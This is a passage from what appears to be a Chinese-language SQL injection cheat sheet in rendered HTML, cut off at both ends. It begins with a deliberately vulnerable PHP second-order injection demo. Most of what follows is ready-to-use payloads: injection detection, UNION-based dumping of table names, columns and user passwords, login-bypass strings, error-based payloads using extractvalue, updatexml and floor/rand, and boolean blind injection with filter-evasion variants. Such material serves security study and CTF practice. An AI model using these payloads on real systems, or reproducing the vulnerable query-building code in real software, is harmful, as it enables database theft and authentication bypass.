class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$tid</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tid&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123;<br>        <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$title</span>);<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO news(tid,title,content) VALUES (<span class="hljs-subst">$tid</span>,&#x27;<span class="hljs-subst">$title</span>&#x27;,&#x27;<span class="hljs-subst">$content</span>&#x27;)&quot;</span>;<br>    <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where tid=<span class="hljs-subst">$tid</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$results</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$results</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;tid&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;tid&#x27;</span>];<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-variable">$results</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$results</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>].<span class="hljs-string">&#x27;    &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Try create a new&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/secondaryinjection.php?tid=6&amp;title=aaa%27 union select 1,user(),3%23&amp;content=qqqqq</code></p>
<p><code>http://127.0.0.1/secondaryinjection.php</code></p>
<h3 id="检测判断sql注入："><a href="#检测判断sql注入：" class="headerlink" title="检测判断sql注入："></a>检测判断sql注入：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=0 //报错</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>正确<br></code></pre></td></tr></table></figure>

<h3 id="判断什么类型注入："><a href="#判断什么类型注入：" class="headerlink" title="判断什么类型注入："></a>判断什么类型注入：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">id=1&quot;</span><br></code></pre></td></tr></table></figure>

<p>可加 “\” 等符号，构造报错，从报错回显中观察是什么类型的错误，如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;our input&#x27;</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>our input<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;out input&#x27;</span>)<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(&quot;our input&quot;)<br></code></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/07/12S2uT.png" srcset="/img/loading.gif" lazyload alt="12S2uT.png"></p>
<p>原理如上</p>
<h3 id="数据库查询版本"><a href="#数据库查询版本" class="headerlink" title="数据库查询版本"></a>数据库查询版本</h3><ul>
<li>Mssql: select @@version</li>
<li>Mysql: select version（）&#x2F;select @@version</li>
<li>oracle: select banner from ￥version</li>
<li>Postgresql: select version（）</li>
</ul>
<h3 id="判断过滤了哪些字符？"><a href="#判断过滤了哪些字符？" class="headerlink" title="判断过滤了哪些字符？"></a>判断过滤了哪些字符？</h3><p>采用异或注入。<br>在id&#x3D;1后面输入 ‘(0)’<br>发现不出错，那就将0换成1&#x3D;1<br>如果出错，那就是成功了</p>
<p>如果括号里面的判断是假的，那么页面就会显示正确<br>那么同理，<br>如果修改里面的内容为length(‘union’)!&#x3D;0<br>如果页面显示正确，那就证明length(‘union’)&#x3D;&#x3D;0的，也就是union被过滤了</p>
<h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><ul>
<li>order by 数字 可以判断字段的个数</li>
<li>也可以用猜字段 union select 1，2，3</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>...<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by n</span><br></code></pre></td></tr></table></figure>

<p>如果n出现了错误那么共有n-1列，union查询必须列数量对齐，也就是说union select 1,2,…,n-1 from …</p>
<h3 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h3><p>在链接后面添加语句<code>union select 1,2,3,4,5,6,7,8,9,10,11#</code>进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。</p>
<h3 id="判断数据库注入"><a href="#判断数据库注入" class="headerlink" title="判断数据库注入"></a>判断数据库注入</h3><p>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> version()<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> database()<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br>操作系统信息：<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@global</span>.version_compile_os <span class="hljs-keyword">from</span> mysql.user<br>数据库权限：<span class="hljs-keyword">and</span> ord(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span> 返回正常说明为root<br></code></pre></td></tr></table></figure>

<h3 id="绕过登陆验证"><a href="#绕过登陆验证" class="headerlink" title="绕过登陆验证"></a>绕过登陆验证</h3><ul>
<li>admin’ –</li>
<li>admin’ #</li>
<li>admin’&#x2F;*</li>
<li>’ or 1&#x3D;1–</li>
<li>’ or 1&#x3D;1#</li>
<li>’ or 1&#x3D;1&#x2F;*</li>
<li>‘) or ‘1’&#x3D;’1–</li>
<li>‘) or (‘1’&#x3D;’1–</li>
</ul>
<h3 id="SQL注入常见函数"><a href="#SQL注入常见函数" class="headerlink" title="SQL注入常见函数"></a>SQL注入常见函数</h3><ul>
<li>group_concat函数 可以把查询的内容组合成一个字符串</li>
<li>load_file(file name ) 读取文件并将文件按字符串返回</li>
<li>left（string，length）返回最左边指定的字符数：</li>
<li>left（database（），1）&gt;‘s’ (猜名字)</li>
<li>length（）判断长度</li>
<li>length（database（）&gt;5</li>
<li>substr（a，b，c）从字符串a中截取 b到c长度</li>
<li>ascii（）将某个字符转为ascii值</li>
<li>ascii（substr（user（），1，1））&#x3D;101#</li>
<li>mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）</li>
</ul>
<h3 id="联合爆库："><a href="#联合爆库：" class="headerlink" title="联合爆库："></a>联合爆库：</h3><p>这里假设有3列：</p>
<p>为了让联合注入工作，首先要知道数据库中的表名，键入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ //--+是把语句闭合后注释掉后面的语句</span><br></code></pre></td></tr></table></figure>

<p>有时程序可能不会打印出所有的行，这时我们就得使用关键字limit一条条进行查询，键入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,table_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>或者可以用group_concat():</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure>

<p>假设有’users’表</p>
<p>现在看其中的一个表，为了提取其信息，键入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<p>注意，我们使用’column’替换了’table’，因为我们想要的是一个表的列信息<br>假设有’username’，’password’，’flag’列，我们可以键入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(username),3 from users --+</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,flag,3 from users --+</span><br></code></pre></td></tr></table></figure>

<p>即可按需查询所需要的信息。</p>
<h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span> floor （<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()可修改）<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">OR</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">8627</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),CONCAT(<span class="hljs-number">0x70307e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e7030</span>,<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)–<span class="hljs-operator">+</span><br>  <br><span class="hljs-operator">-</span> ExtractValue(有长度限制,最长<span class="hljs-number">32</span>位) （<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>可修改）<br>  <br>  <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>))–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> UpdateXml(有长度限制,最长<span class="hljs-number">32</span>位) （<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>可修改）<br><br>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> NAME_CONST(适用于低版本，不太好用)<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> Error based <span class="hljs-keyword">Double</span> Query Injection<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat_ws(<span class="hljs-number">0x7e</span>,version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">having</span> <span class="hljs-built_in">min</span>(<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">5.5</span><span class="hljs-number">.5</span>以上) （<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()可修改）<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)))–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> <span class="hljs-built_in">floor</span>(Mysql): <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br><br><span class="hljs-operator">-</span> Extractvalue(Mysql): <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));<br><br><span class="hljs-operator">-</span> Updatexml(Mysql): <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br><br><span class="hljs-operator">-</span> EXP: <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br><br><span class="hljs-operator">-</span> UTL INADDR. <span class="hljs-keyword">get</span> host address(Oracle): <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>utl inaddrget host address(<span class="hljs-keyword">select</span> bannerO <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<br><br><span class="hljs-operator">-</span> multipoint(Mysql)：<span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> polygon(Mysql)：<span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> multipolygon(Mysql)：<span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <br><span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> linestring(Mysql)：<span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> multilinestring(Mysql)：<span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure>



<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><ul>
<li><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>
</li>
<li><h5 id="布尔条件构造"><a href="#布尔条件构造" class="headerlink" title="布尔条件构造"></a>布尔条件构造</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>正常情况<br> <span class="hljs-string">&#x27;or bool#</span><br><span class="hljs-string"> true&#x27;</span><span class="hljs-keyword">and</span> bool#<br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>不使用空格、注释<br> <span class="hljs-string">&#x27;or(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-literal">true</span><span class="hljs-string">&#x27;and(bool)=&#x27;</span><span class="hljs-number">1</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>不使用<span class="hljs-keyword">or</span>、<span class="hljs-keyword">and</span>、注释<br> <span class="hljs-string">&#x27;^!(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-string">&#x27;=(bool)=&#x27;</span><br> <span class="hljs-string">&#x27;||(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-literal">true</span><span class="hljs-string">&#x27;%26%26(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-string">&#x27;=if((bool),1,0)=&#x27;</span><span class="hljs-number">0</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>不使用等号、空格、注释<br> <span class="hljs-string">&#x27;or(bool)&lt;&gt;&#x27;</span><span class="hljs-number">0</span><br> <span class="hljs-string">&#x27;or((bool)in(1))or&#x27;</span><span class="hljs-number">0</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>其他<br> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (bool) <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>)<br></code></pre></td></tr></table></figure>
</li>
<li><p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or (bool) or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; and (bool) or 1=1 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
</li>
<li><h5 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h5><ul>
<li><p>逻辑判断基本就那些函数：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span> <br>    <br><span class="hljs-comment">//不使用逗号 </span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> regexp <span class="hljs-string">&#x27;^[a-z]&#x27;</span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> like <span class="hljs-string">&#x27;root%&#x27;</span><br><span class="hljs-function"><span class="hljs-title">POSITION</span><span class="hljs-params">(<span class="hljs-string">&#x27;root&#x27;</span> in user()</span></span>)<br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span> <span 